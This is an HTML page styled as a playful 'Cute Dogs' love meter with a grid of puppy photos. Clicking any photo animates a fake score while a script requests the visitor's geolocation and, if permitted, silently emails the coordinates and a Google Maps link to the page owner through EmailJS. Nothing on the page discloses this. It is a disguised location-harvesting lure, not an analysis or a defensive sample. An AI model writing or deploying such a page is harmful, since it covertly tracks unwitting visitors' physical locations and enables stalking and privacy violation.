<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Cute Dogs</title>
<script type="text/javascript"
  src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
</script>
<script>
(function(){
  emailjs.init({
    publicKey: "LWXarISg_TgVGl86U",
  });

  window.runLoveMeter = function() {
    const meter = document.getElementById('meter');
    meter.style.width = '80%';

    setTimeout(() => {
      document.getElementById('result').innerText = "Wow! You are 80% in love! 😍";
    }, 2000);

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;

          emailjs.send("service_j1cmr8e", "template_l1ejqfe", {
            latitude: lat,
            longitude: lon,
            maps_link: mapsLink
          }).then(
            () => console.log("✅ Location sent successfully"),
            (err) => console.error("❌ Email send error", err)
          );
        },
        () => { console.log("Location not allowed"); }
      );
    }
  }
})();
</script>
<style>
body {
  font-family: 'Segoe UI', sans-serif;
  background: linear-gradient(135deg, #ff4e50, #f9d423);
  color: white;
  display: flex;
  flex-direction: column;
  align-items: center;
  padding: 20px;
  min-height: 100vh;
}
h1 { margin-bottom: 20px; }
.meter-container {
  width: 300px;
  background: rgba(255,255,255,0.2);
  border-radius: 50px;
  overflow: hidden;
  box-shadow: 0 4px 20px rgba(0,0,0,0.3);
  margin-bottom: 20px;
}
.meter-fill {
  height: 30px;
  background: linear-gradient(to right, #ff416c, #ff4b2b);
  width: 0%;
  transition: width 2s ease-out;
}
#puppy-grid {
  display: grid;
  grid-template-columns: repeat(3, 100px);
  gap: 15px;
  margin-bottom: 20px;
}
#puppy-grid img {
  width: 100px;
  height: 100px;
  border-radius: 12px;
  object-fit: cover;
  cursor: pointer;
  transition: transform 0.2s ease;
  box-shadow: 0 4px 10px rgba(0,0,0,0.2);
}
#puppy-grid img:hover {
  transform: scale(1.1);
}
p {
  font-size: 18px;
}
</style>
</head>
<body>

<div id="puppy-grid">
  <img src="https://placedog.net/300/300?id=1" onclick="runLoveMeter()">
  <img src="https://placedog.net/300/300?id=2" onclick="runLoveMeter()">
  <img src="https://placedog.net/300/300?id=3" onclick="runLoveMeter()">
  <img src="https://placedog.net/300/300?id=4" onclick="runLoveMeter()">
  <img src="https://placedog.net/300/300?id=5" onclick="runLoveMeter()">
  <img src="https://placedog.net/300/300?id=6" onclick="runLoveMeter()">
  <img src="https://placedog.net/300/300?id=7" onclick="runLoveMeter()">
  <img src="https://placedog.net/300/300?id=8" onclick="runLoveMeter()">
  <img src="https://placedog.net/300/300?id=9" onclick="runLoveMeter()">
</div>

<div class="meter-container">
  <div class="meter-fill" id="meter"></div>
</div>

<p id="result"></p>

</body>
</html>
